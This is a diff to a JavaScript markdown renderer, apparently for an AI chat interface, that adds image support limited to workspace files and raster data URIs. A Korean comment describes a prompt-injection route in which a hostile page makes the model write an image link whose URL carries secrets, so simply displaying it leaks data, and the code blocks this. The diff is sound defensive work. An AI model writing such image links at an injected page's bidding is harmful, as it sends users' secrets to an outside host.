@@ -324,17 +324,62 @@
   /** Pipeline orchestrator — runs block-level transforms (table,
    * headings, lists) before inline ones (emphasis, inline code) so
    * inline regexes never see header / list markers. */
+  function unescapeHtml(s) {
+    return s.replace(/&(amp|lt|gt|quot|#39);/g, function (_m, e) {
+      return { amp: "&", lt: "<", gt: ">", quot: '"', "#39": "'" }[e];
+    });
+  }
+
+  /** 그림 ``![alt](src)`` (v10.64.0). ``<img>`` 는 그려지는 순간 브라우저가 스스로
+   * 요청을 내므로 출처를 좁힌다: 작업 폴더 경로(`api/workspace/file` — 서버가
+   * 워크스페이스 밖·이미지 아닌 파일을 거절한다)와 래스터 ``data:`` URI 만 그림으로.
+   * 외부 http(s) 는 그리지 않고 링크로 둔다 — 인젝션된 페이지가 모델에게
+   * ``![](https://x/?d=<비밀>)`` 을 쓰게 하면 보는 것만으로 새어 나간다(클릭은
+   * 사람의 의도). SVG ``data:`` 는 스크립트를 품을 수 있어 뺀다. 그 밖의 스킴
+   * (``javascript:`` 등)은 글 그대로. 인라인 코드 안은 건드리지 않는다.
+   * 입력은 이미 이스케이프된 글이라 alt·src 를 그대로 속성에 넣어도 따옴표를
+   * 깨지 못한다. 강조보다 먼저 — alt 에 ``<strong>`` 이 끼지 않게. */
+  const MD_IMAGE = /!\[([^\]\n]*)\]\(([^()\s]+)\)/g;
+  const MD_DATA_IMAGE = /^data:image\/(?:png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$/;
+  function renderImages(html) {
+    return html
+      .split(/(`[^`\n]+`)/)
+      .map(function (part, i) {
+        if (i % 2) return part; // 인라인 코드
+        return part.replace(MD_IMAGE, function (all, alt, src) {
+          if (MD_DATA_IMAGE.test(src)) {
+            return '<img class="md-img" src="' + src + '" alt="' + alt + '">';
+          }
+          if (/^https?:\/\//i.test(src)) {
+            return (
+              '<a class="md-img-link" href="' + src + '" target="_blank" rel="noopener noreferrer" ' +
+              'title="External image — not loaded; click to open">🖼 ' + (alt || src) + "</a>"
+            );
+          }
+          if (/^[a-z][a-z0-9+.-]*:/i.test(src) || src.indexOf("//") === 0) return all;
+          const url = escapeHtml(imageUrl(unescapeHtml(src)));
+          return (
+            '<a class="md-img-wrap" href="' + url + '" target="_blank" rel="noopener">' +
+            '<img class="md-img" src="' + url + '" alt="' + alt + '" loading="lazy"></a>'
+          );
+        });
+      })
+      .join("");
+  }
+
   function markdownInline(s) {
     let html = renderTables(s);
     html = renderHeadings(html);
     html = renderLists(html);
+    html = renderImages(html);
     html = renderEmphasis(html);
     html = html.replace(/`([^`\n]+)`/g, "<code>$1</code>");
     return html;
   }
 
   /** Apply a tiny subset of markdown — fenced code blocks, headings
-   * (h1-h3), GFM tables, lists, bold/italic, and inline code.
+   * (h1-h3), GFM tables, lists, images (workspace paths and raster
+   * ``data:`` only — see renderImages), bold/italic, and inline code.
    * Everything else stays as escaped text. No external library;
    * variants beyond this set are intentionally out of scope
    * (NFR-MD-1: zero new JS deps).
